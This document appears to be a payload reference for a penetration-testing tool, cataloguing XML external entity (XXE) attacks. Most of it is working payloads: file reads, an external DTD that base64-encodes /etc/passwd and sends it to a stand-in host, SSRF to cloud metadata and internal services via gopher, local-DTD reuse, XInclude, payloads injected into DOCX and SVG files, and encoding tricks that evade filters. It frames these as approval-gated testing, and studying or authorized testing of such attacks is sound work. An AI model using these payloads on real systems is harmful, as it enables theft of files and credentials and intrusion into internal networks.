# XXE payloads (shared by xxe-inband / xxe-blind)
# Benign internal entity for detection; file reads / OOB are the variants (approval). NO DoS (no billion laughs).

## Detection — benign internal entity (feeder)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x "RS7F3Q"> ]>
<root><name>&x;</name></root>
```
If `RS7F3Q` appears in the response, the parser resolves entities → XXE candidate.

## In-band file read (xxe-inband)
```xml
<!DOCTYPE r [ <!ENTITY f SYSTEM "file:///etc/hostname"> ]>
<root><name>&f;</name></root>          <!-- prefer a non-sensitive marker file; /etc/hostname over /etc/passwd -->
```
Error-based (when the entity can't go in a text node): trigger a parse error that echoes the file.

## SSRF-via-XXE
```xml
<!DOCTYPE r [ <!ENTITY f SYSTEM "http://169.254.169.254/ or http://INTERNAL/"> ]>
<root>&f;</root>                        <!-- hand cloud-metadata to ssrf-cloud; this proves the fetch -->
```

## Blind / OOB (xxe-blind) — external DTD with parameter entities
```xml
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://TOKEN.oob.example/x.dtd"> %ext;
]>
<root>test</root>
```
`x.dtd` (on your OOB host):
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TOKEN.oob.example/?d=%file;'>">
%eval; %exfil;
```
A callback carrying the file content (or just a DNS/HTTP hit) proves blind XXE.

## Upload vectors
- **SVG:** `<svg xmlns="..."><!DOCTYPE...>` — image upload that gets parsed.
- **DOCX/XLSX:** XML inside the zip (`word/document.xml`) — repackage with an XXE payload.

## Safety
Prefer `/etc/hostname` over `/etc/passwd` for proof; never entity-expansion DoS; never read secrets
you don't need. External file read + SSRF-via-XXE are approval-gated.

---
## Extended — php://filter base64 read · XXE port scan

### Blind file read of "unprintable" files — php://filter base64 (KEY technique)
Files with `&`, `<`, newlines, or binary bytes break a naive SYSTEM entity / exfil URL. Wrap the read
in a PHP base64 filter so the content is URL-safe base64 before it leaves — this is what makes blind
exfil of `/etc/passwd`, config files, source, etc. actually work (PHP targets).
`x.dtd` (external DTD on your OOB host):
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TOKEN.oob.example/?d=%file;'>">
%eval; %exfil;
```
The callback carries base64; decode offline. Also reads PHP source (`...resource=index.php`) without it
executing.

### Time-based internal port scan via XXE (no OOB needed)
Point a SYSTEM entity at an internal `host:port`; infer state from parse delay:
```xml
<!DOCTYPE r [ <!ENTITY f SYSTEM "http://INTERNAL_IP:PORT/"> ]>
<root>&f;</root>
```
Fast error = closed/refused; hang-then-timeout = filtered; quick body/variant = open. Hand confirmed
internal reachability to `ssrf-*`; keep probes rate-limited and in-scope.

---
## Extended arsenal — parser behavior matrix (who resolves what, by default)

Pick the technique that matches the stack. "Default-vuln" = resolves external entities/DTDs out of the box.
| stack / API | external entities by default | notes |
|---|---|---|
| PHP libxml **< 2.9.0** (`DOMDocument`, `simplexml_load_*`) | YES | ≥2.9.0 OFF unless `LIBXML_NOENT` / `libxml_disable_entity_loader(false)`; `php://filter` exfil works |
| Java `DocumentBuilderFactory` / `SAXParser` (no features set) | YES | supports `file jar netdoc gopher http ftp`; `file://` on a DIR → listing; very exploitable |
| .NET `XmlDocument` / `XmlTextReader` (pre-4.5.2, DtdProcessing≠Prohibit) | YES | `XmlReader` secure since 4.5.2; local Windows DTDs available for reuse |
| Python `lxml` | YES (network too) | OFF with `resolve_entities=False` / `no_network`; supports XInclude |
| Python `ElementTree` / `minidom` (expat) | internal only | expat blocks external general entities (no net) but expands internal → billion-laughs feasible |
| Ruby `Nokogiri` | NO | needs explicit `NOENT` |
| Go `encoding/xml` | NO | no DTD/entity expansion — generally not vulnerable |

---
## Extended arsenal — classic file-read wrapper matrix
```
file:///etc/hostname                         # Linux benign marker
file:///c:/windows/win.ini                   # Windows benign marker
file://HOST/share/file     \\HOST\share      # UNC (Windows) — also leaks SMB/NetNTLM auth (capture/OOB)
file:///etc/    file:///c:/                   # Java: DIRECTORY LISTING
netdoc:///etc/hostname                        # Java legacy alias for file://
jar:file:///path!/inner                       # Java: read a file inside a local/remote archive
jar:http://TOKEN.oob.example/x.jar!/          # Java: SSRF fetch + unzip
gopher://INTERNAL_IP:PORT/_<raw>              # Java (no https): speak raw TCP to internal svc -> ssrf-*
http://TOKEN.oob.example/   ftp://TOKEN.oob.example/   # OOB fetch (blind proof)
dict://INTERNAL_IP:PORT/    ldap://INTERNAL_IP/        # SSRF handoff (stack-dependent)
```

---
## Extended arsenal — parameter-entity mechanics & OOB ladder (why it's shaped this way)

Rules that dictate the payload shape:
- A **general** entity (`&x;`) referencing an external SYSTEM id can be placed in element content, but
  **cannot** appear inside markup declarations in the internal DTD subset.
- A **parameter** entity (`%x;`) can build markup, but a parameter-entity reference inside a markup
  declaration is **forbidden in the internal subset** → you must host the nesting in an **external DTD**.
- Inside the external DTD, a literal `%` that must expand *later* is written `&#x25;` (so the inner
  `<!ENTITY % exfil ...>` is created only when `%eval;` fires).

`x.dtd` (OOB host) — annotated:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">  <!-- read (b64-safe) -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TOKEN.oob.example/?d=%file;'>">  <!-- defer % -->
%eval;                                                                                <!-- builds exfil -->
%exfil;                                                                               <!-- fires callback -->
```
Request body that pulls it:
```xml
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://TOKEN.oob.example/x.dtd"> %ext; ]>
<root>x</root>
```

---
## Extended arsenal — error-based exfil (no outbound egress)

When the target can't reach your OOB host but DOES surface parser errors, exfil through the error message.
Best for SHORT single-line files (e.g. `/etc/hostname`) — newlines break the URI echo.
`x.dtd` (or inline where the parser allows param-entities in the internal subset):
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval; %error;
```
The parser tries to open `file:///nonexistent/<hostname>` → the failure message echoes the file content.

---
## Extended arsenal — local-DTD reuse (fully restricted parser, no external fetch)

When external DTD fetch is blocked but `<!DOCTYPE>` + internal subset are allowed: load a DTD that already
exists on disk, then **redefine a parameter entity it references** so your injected markup runs when the
local DTD expands (first parameter-entity definition wins).
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % ENT 'any)>                                   <!-- ENT = a param-entity the chosen DTD uses -->
    <!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;error;
    <!ELEMENT aa (bb'>                                     <!-- re-balance the construct ENT sat in -->
  %local_dtd;
]>
<r/>
```
Candidate on-disk DTDs (pick one present on the target; set `ENT`/closing tokens to match it):
```
Linux : /usr/share/xml/fontconfig/fonts.dtd
        /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
        /usr/share/yelp/dtd/docbookx.dtd
Windows(.NET): C:\Windows\System32\wbem\xml\cim20.dtd
               C:\Windows\System32\wbem\xml\cim-v2-fragment.dtd
```

---
## Extended arsenal — XInclude (no control over DOCTYPE)

Use when your input is dropped INTO a server-built XML doc, so you can't add a `<!DOCTYPE>`. Requires the
processor to run XInclude (Java `setXIncludeAware(true)`, lxml `.xinclude()`, .NET).
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname" encoding="UTF-8"/>   <!-- raw text read -->
  <xi:include parse="xml"  href="http://TOKEN.oob.example/xi"/>             <!-- SSRF / blind proof -->
</root>
```
`parse="text"` reads non-XML/binary-ish safely; `parse="xml"` requires the target be well-formed XML.

---
## Extended arsenal — file-format / container vectors (inject the DOCTYPE into the right part)

| container | inject into | repackage |
|---|---|---|
| **SVG** (image upload) | the SVG root (add `<!DOCTYPE ...>`), or `xlink:href` for SSRF | upload as-is |
| **DOCX / PPTX** (OOXML zip) | `word/document.xml` / `ppt/presentation.xml`, or `[Content_Types].xml` | re-zip |
| **XLSX** | `xl/workbook.xml`, `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | re-zip |
| **ODT / ODS** (OpenDocument zip) | `content.xml` | re-zip |
| **SOAP** | the `<soap:Envelope>` (prepend DOCTYPE) | send as request body |
| **SAML Response** | the XML before signature check (if parse precedes verify) | note: sig-wrapping = separate class → `oauth`/`auth` |
| **RSS / Atom / XML-RPC / WSDL / XSD** | the request/feed body; `xsd:import schemaLocation` → SSRF | — |
| **XMP metadata** (JPEG/PDF) | the embedded `<?xpacket?>...</x:xmpmeta>` XML | embed |
| **GPX / KML / plist / XSLT** | the document root | `document()` in XSLT → SSRF/read handoff |

```xml
<!-- DOCX word/document.xml example: prepend the DOCTYPE, then re-zip the archive -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://TOKEN.oob.example/d.dtd"> %ext; ]>
<w:document ...>...</w:document>
```

---
## Extended arsenal — encoding & filter evasion

Defeat filters that grep for `<!DOCTYPE` / `<!ENTITY` on ASCII by re-encoding the whole document; the
parser honors the declared `encoding`, the signature filter misses it.
```
# UTF-16: re-encode and keep the BOM, declare encoding="UTF-16"
iconv -f UTF-8 -t UTF-16LE payload.xml > payload-utf16.xml      # (prepend BOM FF FE)
<?xml version="1.0" encoding="UTF-16"?> ...
# UTF-7 (legacy .NET/Java): <?xml version="1.0" encoding="UTF-7"?>  then body in UTF-7  ("<" => +ADw-)
# Other evasions: SYSTEM<->PUBLIC swap, newlines/tabs/comments between DOCTYPE tokens
<!ENTITY f PUBLIC "-//x//y//EN" "file:///etc/hostname">
```

---
## Extended arsenal — SSRF-via-XXE protocol handoff
```
http://169.254.169.254/latest/meta-data/        # cloud IMDS (IMDSv1 GET only; XXE can't add the v2 token header) -> ssrf-cloud
http://INTERNAL_IP/   http://INTERNAL_HOST:PORT/ # internal HTTP surface -> ssrf-inband
gopher://INTERNAL_IP:6379/_<redis cmds>          # Java: raw TCP to Redis/SMTP/etc. -> ssrf-*
```
XXE can issue a GET-like fetch but can't set request headers/body → hand anything needing those to `ssrf-*`.
Treat a bare DNS hit as reachability only; claim file read ONLY when the callback carries the file bytes.

---
## Extended arsenal — DoS feasibility (DO NOT RUN — catalogue only)

Documented so the report can note the control gap; the engagement never fires these.
```
# Billion laughs (entity-expansion): nested entities &lol9; expand exponentially -> memory blowup
# Quadratic blowup: one large entity referenced thousands of times
# External hang: <!ENTITY x SYSTEM "file:///dev/random">   (or /dev/zero) -> never terminates
# Oversized internal read: file:///dev/zero / a huge file -> memory exhaustion
```
If entity resolution is confirmed, note "entity-expansion DoS feasible" from the detection PoC WITHOUT
running an expansion.

---
## Extended arsenal — confirmation discipline & tooling

| variant | proof required |
|---|---|
| detection | benign internal entity `RS7F3Q` echoed in the response |
| in-band read | the external file's REAL bytes reflected in-band |
| blind / OOB | attributable `TOKEN.oob.example` hit CARRYING the file bytes (bare DNS = reachability only) |
| error-based | file content appears inside the parser error message |
| SSRF-via-XXE | OOB hit from the target egress / internal service response — hand to `ssrf-*` |

Tooling: a collaborator/OOB host serving `x.dtd` and logging callbacks; repackage OOXML with any zip tool;
an XXE-automation tool can chain the external-DTD blind flow — confirm hits MANUALLY. Benign ethos: prefer
`/etc/hostname` over `/etc/passwd`; file read beyond a marker, `php://filter` secret exfil, and
SSRF-via-XXE are approval-gated; redact any secret; never run entity-expansion DoS.
